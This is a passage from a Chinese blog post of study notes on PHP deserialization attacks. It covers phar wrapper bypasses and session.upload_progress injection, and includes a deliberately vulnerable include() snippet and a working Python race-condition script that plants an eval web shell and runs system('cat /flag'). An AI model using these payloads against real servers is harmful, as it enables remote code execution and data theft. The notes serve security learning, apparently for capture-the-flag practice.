invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><p>phar文件要能够上传到服务器端。<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p>
<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h4><p>当环境限制了<code>phar</code>不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line">php:<span class="comment">//filter/resource=phar:///test.phar/test.txt</span></span><br></pre></td></tr></tbody></table></figure>

<p>当环境限制了<code>phar</code>不能出现在前面的字符里，还可以配合其他协议进行利用。<br><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar</code></p>
<p>GIF格式验证可以通过在文件头部添加<code>GIF89a</code>绕过<br>1、<code>$phar-&gt;setStub(“GIF89a”.“&lt;?php __HALT_COMPILER(); ?&gt;”);</code> //设置stub<br>2、生成一个<code>phar.phar</code>，修改后缀名为<code>phar.gif</code></p>
<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p> <code>session.upload_progress</code> 来进行利用</p>
<p>如果没有特别配置的话, session 通常存储在服务器上的某个文件夹中, 并且文件名通常为 <code>sess_{你的SESSION_ID}</code></p>
<p>由于存储时时通过反序列化, 所以原本的字符串会被保留。于是我们可以注入 PHP 代码, 再通过文件包含执行他</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以进行任意文件包含 (或允许包含 session 存储文件)</li>
<li>知道session文件存放路径，可以尝试默认路径</li>
<li>具有读取和写入session文件的权限</li>
</ol>
<p>若服务器存在文件 test.php:</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">"<span class="subst">$b</span>"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用类似条件竞争的方法来进行（python示例）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">'KW'</span></span><br><span class="line">data = {<span class="string">"cmd"</span>:<span class="string">"system('cat /flag');"</span>}</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>) <span class="comment"># 创建 dummy 数据</span></span><br><span class="line">        resp = session.post( <span class="string">'http://[ip]/test.php'</span>, data={<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>}, files={<span class="string">'file'</span>: (<span class="string">'KW.txt'</span>,f)}, cookies={<span class="string">'PHPSESSID'</span>: sessid} ) <span class="comment"># 注入恶意代码到存储的 SESSION 中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">'http://[ip]/test.php?file=session/sess_'</span>+sessid,data=data) <span class="comment"># 包含 SESSION 文件, 执行恶意代码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'tgao.txt'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[+++++++++++++]retry"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></tbody></table></figure>

<p>如果是反序列化的话, 我们也可以进行反序列化注入</p>
<p>如果我们的文件名可控, 我们在之前放上 <code>|</code> 表示前面的是键名, 后再写入恶意代码。注意引号要进行转义。</p>
<p>解析session文件时直接对’|’后的值进行反序列化处理说明：</p>
<blockquote>
<p>当会话自动开始或者通过 <code>session_start()</code> 手动开始的时候， <code>PHP</code> 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 <code>PHP</code> 默认的， 也可能是扩展提供的（<code>SQLite</code> 或者 <code>Memcached</code> 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），<code>PHP</code> 会自动反序列化数据并且填充 <code>$_SESSION</code> 超级全局变量。</p>
</blockquote>
<p>*注：此处感谢2月22日凌晨0:48:59以后土豆学长的纠正和指导，向他半夜还在改作业的敬业程度致敬！</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://holybeagle.github.io">Quuiieet</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://holybeagle.github.io/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://holybeagle.github.io/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://holybeagle.github.io" target="_blank">Quuiieet's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/21/2024-03-21-Python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%87%AA%E5%AD%98%EF%BC%89/" title="Python基础知识（自存）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python基础知识（自存）</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/03/2024-03-03-MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="MySQL学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MySQL学习笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Quuiieet</div><div class="author-info__description">だからサイレンス 灯すためと</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HolyBeagle"><i class="fab fa-github"></i><span>Follow</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/HolyBeagle" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:quuiieet@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">前往博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%97%E6%AF%8D%E6%A0%87%E8%AF%86"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">序列化的字母标识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">序列化后的字符串格式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">常用魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#construct"><span class="toc-number">1.3.2.0.0.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sleep"><span class="toc-number">1.3.2.0.0.2.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wakeup"><span class="toc-number">1.3.2.0.0.3.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.3.2.0.0.4.</span> <span class="toc-text">__toString</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">执行顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">反序列化绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">绕过__wakeup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">绕过部分正则</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A0%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.2.1.</span> <span class="toc-text">利用加号绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">利用引用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">16进制绕过字符的过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B51%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="toc-number">1.4.0.5.1.</span> <span class="toc-text">情况1：过滤后字符变多</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B52%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="toc-number">1.4.0.5.2.</span> <span class="toc-text">情况2：过滤后字符变少</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%B1%BB%E7%BB%95%E8%BF%87%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">利用不完整类绕过序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">原生类反序列化利用*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Error"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Error</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E6%91%98%E8%A6%81"><span class="toc-number">1.5.1.1.0.1.</span> <span class="toc-text">类摘要</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.1.1.0.2.</span> <span class="toc-text">类属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.1.1.0.3.</span> <span class="toc-text">类方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Error-%E5%86%85%E7%BD%AE%E7%B1%BB%E6%9E%84%E9%80%A0XSS"><span class="toc-number">1.5.1.1.0.4.</span> <span class="toc-text">使用 Error 内置类构造XSS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#POC"><span class="toc-number">1.5.1.1.0.5.</span> <span class="toc-text">POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exception"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">Exception</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E6%91%98%E8%A6%81-1"><span class="toc-number">1.5.1.2.0.1.</span> <span class="toc-text">类摘要</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E5%B1%9E%E6%80%A7-1"><span class="toc-number">1.5.1.2.0.2.</span> <span class="toc-text">类属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.5.1.2.0.3.</span> <span class="toc-text">类方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.1.2.0.4.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#POC-1"><span class="toc-number">1.5.1.2.0.5.</span> <span class="toc-text">POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DirectoryIterator"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">DirectoryIterator</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.5.1.3.0.1.</span> <span class="toc-text">代码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.2.</span> <span class="toc-text">Phar 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">phar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">常见的流包装器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">phar文件结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAphar%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">生成一个phar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">绕过方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.3.</span> <span class="toc-text">session反序列化</span></a></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" title="sqli-lab通关笔记">sqli-lab通关笔记</a><time datetime="2024-07-08T16:00:00.000Z" title="发表于 2024-07-09 00:00:00">2024-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/24/2024-03-24-Flask%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/" title="安装笔记(Flask,docker+wsl)">安装笔记(Flask,docker+wsl)</a><time datetime="2024-03-23T16:00:00.000Z" title="发表于 2024-03-24 00:00:00">2024-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/21/2024-03-21-Python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%87%AA%E5%AD%98%EF%BC%89/" title="Python基础知识（自存）">Python基础知识（自存）</a><time datetime="2024-03-20T16:00:00.000Z" title="发表于 2024-03-21 00:00:00">2024-03-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="PHP反序列化学习笔记">PHP反序列化学习笔记</a><time datetime="2024-03-09T16:00:00.000Z" title="发表于 2024-03-10 00:00:00">2024-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/2024-03-03-MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="MySQL学习笔记">MySQL学习笔记</a><time datetime="2024-03-02T16:00:00.000Z" title="发表于 2024-03-03 00:00:00">2024-03-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By Quuiieet</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I'm not a robot AI challenging you</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>